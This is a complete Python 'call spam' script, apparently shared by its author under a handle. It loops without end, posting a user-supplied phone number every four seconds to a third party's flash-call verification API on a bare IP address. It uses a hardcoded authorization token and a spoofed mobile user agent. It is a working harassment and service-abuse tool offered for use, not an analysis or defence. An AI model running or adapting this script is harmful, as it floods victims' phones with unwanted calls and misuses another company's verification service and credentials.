import requests
import json
import time
print('''
Coded By Ghalwash
Send Calls only spam
IG-FB-TM-Github user
@Mrfa0gh
'''
)
url = "https://31.171.171.90/api/phone-numbers/auth-flash-call"
phone_number = input("Enter YOur Number (with +2) : ")
headers = {
'User-Agent': "okhttp/4.10.0",
'Connection': "Keep-Alive",
'Accept-Encoding': "gzip",
'Content-Type': "application/json",
'Authorization': "AzmJsc1Hs6w1ufp"
}
while True:
    payload = json.dumps({
        "phoneNumber": phone_number})
    response = requests.post(url, data=payload, headers=headers)
    print(response.text)
    time.sleep(4)
